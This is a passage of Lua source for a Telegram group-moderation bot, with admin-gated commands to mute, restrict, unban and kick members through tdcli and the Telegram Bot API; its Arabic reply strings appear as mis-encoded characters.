tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil) 
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ ΩΩΨ§") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± @(.*)$") and Admin(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "Ω­ Ψ§ΩΨ§ ΩΨ³Ψͺ ΩΨ­ΨΈΩΨ±Ψ§ \n") 
return false 
end
database:srem(bot_id.."Ban:User"..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil) 
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ ΩΩΨ§") 
else
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± (%d+)$") and Admin(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± (%d+)$") 
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "Ω­ Ψ§ΩΨ§ ΩΨ³Ψͺ ΩΨ­ΨΈΩΨ±Ψ§ \n") 
return false 
end
database:srem(bot_id.."Ban:User"..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil) 
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ ΩΩΨ§") 
return false
end

if text == ("ΩΨͺΩ") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
return false 
end 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
database:sadd(bot_id.."Muted:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΩΨͺΩΩ ΩΩ ΩΩΨ§") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΩΨͺΩ @(.*)$") and Admin(msg) then
local username = text:match("^ΩΨͺΩ @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
function Function_Tshake(extra, result, success)
if result.id_ then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
return false 
end 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Muted:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΩΨͺΩΩ ΩΩ ΩΩΨ§") 
else
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΩΨͺΩ (%d+)$") and Admin(msg) then
local userid = text:match("^ΩΨͺΩ (%d+)$")
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
database:sadd(bot_id.."Muted:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΩΨͺΩΩ ΩΩ ΩΩΨ§") 
end
return false
end
if text and text:match('^ΩΨͺΩ (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
local TextEnd = {string.match(text, "^(ΩΨͺΩ) (%d+) (.*)$")}
function Function_Tshake(extra, result, success)
if TextEnd[3] == 'ΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'Ψ³Ψ§ΨΉΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'Ψ―ΩΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('Ψ―ΩΩΩΩ',"Ψ―ΩΨ§ΩΩ") 
TextEnd[3] = TextEnd[3]:gsub('Ψ³Ψ§ΨΉΩ',"Ψ³Ψ§ΨΉΨ§Ψͺ") 
TextEnd[3] = TextEnd[3]:gsub("ΩΩΩ","Ψ§ΩΨ§Ω") 
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
Reply_Status(msg,result.sender_user_id_,"reply", "Ω­ ΨͺΩ ΩΨͺΩΩ ΩΩΨ―Ψ© ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end

if text and text:match('^ΩΨͺΩ (%d+) (.*) @(.*)$') and Admin(msg) then
local TextEnd = {string.match(text, "^(ΩΨͺΩ) (%d+) (.*) @(.*)$")}
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
if TextEnd[3] == 'ΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'Ψ³Ψ§ΨΉΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'Ψ―ΩΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('Ψ―ΩΩΩΩ',"Ψ―ΩΨ§ΩΩ") 
TextEnd[3] = TextEnd[3]:gsub('Ψ³Ψ§ΨΉΩ',"Ψ³Ψ§ΨΉΨ§Ψͺ") 
TextEnd[3] = TextEnd[3]:gsub("ΩΩΩ","Ψ§ΩΨ§Ω") 
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
Reply_Status(msg,result.id_,"reply", "Ω­ ΨͺΩ ΩΨͺΩΩ ΩΩΨ―Ψ© ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, Function_Tshake, nil)
return false
end
if text == ("Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Muted:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩ ΩΩ ΩΩΨ§") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ @(.*)$") and Admin(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Muted:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩ ΩΩ ΩΩΨ§") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ (%d+)$") and Admin(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ (%d+)$") 
database:srem(bot_id.."Muted:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩ ΩΩ ΩΩΨ§") 
return false
end

if text == ("ΨͺΩΩΩΨ―") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΩΩΨ― @(.*)$") and Admin(msg) then
local username = text:match("^ΨͺΩΩΩΨ― @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
return false 
end 
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΩΩΨ― (%d+)$") and Admin(msg) then
local userid = text:match("^ΨͺΩΩΩΨ― (%d+)$")
if Rank_Checking(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
return false
end
if text and text:match('^ΨͺΩΩΩΨ― (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
local TextEnd = {string.match(text, "^(ΨͺΩΩΩΨ―) (%d+) (.*)$")}
function Function_Tshake(extra, result, success)
if TextEnd[3] == 'ΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'Ψ³Ψ§ΨΉΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'Ψ―ΩΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('Ψ―ΩΩΩΩ',"Ψ―ΩΨ§ΩΩ") 
TextEnd[3] = TextEnd[3]:gsub('Ψ³Ψ§ΨΉΩ',"Ψ³Ψ§ΨΉΨ§Ψͺ") 
TextEnd[3] = TextEnd[3]:gsub("ΩΩΩ","Ψ§ΩΨ§Ω") 
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
Reply_Status(msg,result.sender_user_id_,"reply", "Ω­ ΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩΨ―Ψ© ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end

if text and text:match('^ΨͺΩΩΩΨ― (%d+) (.*) @(.*)$') and Admin(msg) then
local TextEnd = {string.match(text, "^(ΨͺΩΩΩΨ―) (%d+) (.*) @(.*)$")}
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
if TextEnd[3] == 'ΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'Ψ³Ψ§ΨΉΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'Ψ―ΩΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('Ψ―ΩΩΩΩ',"Ψ―ΩΨ§ΩΩ") 
TextEnd[3] = TextEnd[3]:gsub('Ψ³Ψ§ΨΉΩ',"Ψ³Ψ§ΨΉΨ§Ψͺ") 
TextEnd[3] = TextEnd[3]:gsub("ΩΩΩ","Ψ§ΩΨ§Ω") 
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
Reply_Status(msg,result.id_,"reply", "Ω­ ΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩΨ―Ψ© ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text == ("Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function Function_Tshake(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―Ω") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― @(.*)$") and Admin(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―Ω") 
else
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― (%d+)$") and Admin(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― (%d+)$")
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―Ω") 
return false
end
if text == ("Ψ·Ψ±Ψ―") and msg.reply_to_message_id_ ~=0 and Admin(msg) then
if not Creator(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false 
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ Ψ·Ψ±Ψ―Ω ΩΩ ΩΩΨ§") 
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end 
if text and text:match("^Ψ·Ψ±Ψ― @(.*)$") and Admin(msg) then 
local username = text:match("^Ψ·Ψ±Ψ― @(.*)$")
if not Creator(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false 
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
Kick_Group(msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ Ψ·Ψ±Ψ―Ω ΩΩ ΩΩΨ§") 
end,nil) 
end
else
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end 

if text and text:match("^Ψ·Ψ±Ψ― (%d+)$") and Admin(msg) then 
local userid = text:match("^Ψ·Ψ±Ψ― (%d+)$") 
if not Creator(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
if Rank_Checking(userid, msg.chat_id_) == true then
